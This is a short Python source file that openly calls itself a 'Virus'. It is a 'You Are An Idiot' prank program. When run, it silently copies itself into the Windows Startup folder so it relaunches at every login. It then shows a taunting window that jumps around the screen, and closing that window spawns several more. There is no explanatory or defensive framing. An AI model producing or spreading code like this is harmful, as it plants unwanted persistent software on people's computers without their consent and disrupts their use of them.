import pyautogui
import tkinter as tk
import random
import os
import shutil
import sys
import ctypes
import requests
import socket
import platform
import time


class Virus:

    @staticmethod
    def gui():
        global window
        window = tk.Tk()
        window.title("You Are An Idiot!")
        window.geometry("300x150")
        window.configure(bg="black")
        window.resizable(False, False)

        label = tk.Label(window, text="😂 YOU ARE AN IDIOT 😂", fg="red", bg="black", font=("Arial", 16, "bold"))
        label.pack(expand=True)

        window.protocol("WM_DELETE_WINDOW", Virus.spawn_multiple)

        Virus.move_window()
        window.mainloop()

    @staticmethod
    def move_window():
        x = random.randint(0, window.winfo_screenwidth() - 300)
        y = random.randint(0, window.winfo_screenheight() - 150)
        window.geometry(f"300x150+{x}+{y}")
        window.after(500, Virus.move_window)

    @staticmethod
    def spawn_multiple():
        for _ in range(5):
            Virus.gui()

    @staticmethod
    def add_to_startup():
        try:
            if getattr(sys, 'frozen', False):
                script_path = sys.executable
            else:
                script_path = os.path.abspath(__file__)

            startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            destination = os.path.join(startup_folder, os.path.basename(script_path))

            if not os.path.exists(destination):
                shutil.copy(script_path, destination)
                pass
            else:
                pass
        except Exception as e:
            print(f"Error copying to startup: {e}")







Virus.add_to_startup()





Virus.gui()
